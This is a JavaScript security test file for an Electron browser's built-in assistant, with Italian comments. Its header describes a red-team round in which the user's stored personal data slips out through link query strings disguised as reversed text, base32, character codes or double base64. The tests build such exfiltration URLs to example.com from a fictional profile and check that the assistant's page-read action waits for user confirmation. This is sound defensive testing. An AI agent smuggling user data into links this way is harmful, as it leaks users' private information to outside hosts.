// #553 giro 11 — i dati dell'utente escono ancora, con un travestimento diverso.
//
// Il giro 10 aveva trovato questa porta e la cura ha aggiunto due trasformazioni
// all'elenco (esadecimale, lettere spostate). L'elenco resta un elenco: le
// lettere al contrario, la base a trentadue e i codici dei caratteri passano.
// Il controllo che guarda la FORMA del link — un blocco opaco di dati nella
// coda dell'indirizzo, qualunque cosa contenga — li fermerebbe tutti, ma dalla
// chat e' ancora spento.

import { test, expect } from '../../fixtures/electron.mjs';

const NEWTAB = 'filo://newtab/';
const DATO = 'MarioRossiBolognaviaGaribaldi12';

const base32 = (s) => {
  const A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = '';
  let out = '';
  for (const c of s) bits += c.charCodeAt(0).toString(2).padStart(8, '0');
  for (let i = 0; i < bits.length; i += 5) out += A[parseInt(bits.slice(i, i + 5).padEnd(5, '0'), 2)];
  return out;
};

const TRAVESTIMENTI = {
  'scritti al contrario': [...DATO].reverse().join(''),
  'in base trentadue': base32(DATO),
  'come codici dei caratteri': [...DATO].map((c) => c.charCodeAt(0)).join('.'),
  'impacchettati due volte': Buffer.from(Buffer.from(DATO).toString('base64')).toString('base64'),
};

const esegui = (app, action) => app.evaluate((_e, a) => globalThis.SN_EXECUTE_FILO_ACTION(a), action);

async function seedMemory(app) {
  await app.evaluate(async () => {
    await globalThis.SN_FILO_MEMORY.setMemory({
      PROFILO: 'Si chiama Mario Rossi, vive a Bologna in via Garibaldi 12.',
      PREFERENZE: 'Tema scuro.',
    });
  });
}

async function intercettaRete(app) {
  await app.evaluate(() => {
    globalThis.__rete = [];
    const orig = globalThis.fetch;
    globalThis.__ripristinaRete = () => { globalThis.fetch = orig; };
    globalThis.fetch = async (u) => {
      globalThis.__rete.push(String(u));
      return new Response('<html><body><main><p>ok</p></main></body></html>', {
        status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
      });
    };
  });
}

const contattati = (app) => app.evaluate(() => globalThis.__rete.slice());

test.afterEach(async ({ app }) => {
  await app.evaluate(() => { try { globalThis.__ripristinaRete?.(); } catch (_) {} });
});

for (const [come, payload] of Object.entries(TRAVESTIMENTI)) {
  test(`i dati ${come} aspettano l'OK dell'utente`, async ({ app, openTab }) => {
    test.setTimeout(60_000);
    await openTab(NEWTAB);
    await seedMemory(app);
    await intercettaRete(app);
    const url = `https://example.com/c?d=${payload}`;
    const esito = await esegui(app, { type: 'LEGGI_PAGINA', url });
    expect(esito.needsConfirm).toBe(2);
    expect(esito.executed).toBe(false);
    expect(await contattati(app)).not.toContain(url);
  });
}
